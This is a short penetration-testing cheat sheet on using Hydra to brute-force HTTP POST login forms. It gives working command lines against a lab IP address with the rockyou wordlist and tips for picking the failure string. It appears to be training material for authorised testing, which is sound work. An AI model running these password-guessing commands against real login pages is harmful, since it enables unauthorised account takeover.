Hydra - HTTP POST Form

Concept

Hydra can brute force web login forms by sending POST requests and detecting a failed login condition string in the response.

Identify POST request (Burp / browser)

Capture a login request and extract:

  • Form endpoint (e.g. /index.php)
  • POST parameters (e.g. username/password fields)
  • Failure message in the response

Generic syntax

hydra -l <USER> -P <WORDLIST> <IP> http-post-form "<PATH>:<POST_DATA>:<FAIL_STRING>"

Example structure

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form \
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

POST data format

username_field=user&password_field=^PASS^

Failure condition (important)

Hydra uses the failure string to detect invalid logins. It must match text returned after a failed attempt.

Tips for failure string

  • Keep it short to avoid false positives
  • Avoid generic words like username or password
  • Use unique error messages from the application

Verbose output

hydra -l user -P /usr/share/wordlists/rockyou.txt -vV 192.168.50.201 http-post-form \
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"

Limit tasks

hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 192.168.50.201 http-post-form \
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"

Stop on success

hydra -l user -P /usr/share/wordlists/rockyou.txt -f 192.168.50.201 http-post-form \
"/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"

Notes

  • Requires accurate request interception (e.g. Burp Suite).
  • Hydra evaluates responses to determine success/failure.
  • Web Application Firewalls (WAFs) or rate limiting may block or slow attacks.
  • Brute force on web forms generates noticeable traffic and logs.
